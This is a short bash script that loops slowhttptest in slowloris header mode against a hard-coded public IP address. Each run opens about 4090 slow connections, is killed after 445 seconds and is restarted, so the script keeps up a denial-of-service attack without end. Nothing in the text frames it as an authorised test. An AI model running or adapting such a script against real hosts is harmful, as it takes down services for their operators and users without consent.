#!/bin/bash

#cmd=$1
#t=$2

while true; do
  slowhttptest -c 4090 -H -i 35 -r 3 -t GET -u https://150.165.146.135 -x 24 -p 5 -l 7200 &
  #pid=$!
  pid=`/bin/ps -fu $USER| grep "slowhttptest" | grep -v "grep" | awk '{print $2}'`
  echo "pid: $pid"
  sleep 445
  killall -s SIGTERM slowhttptest
  #kill -15 $pid
done
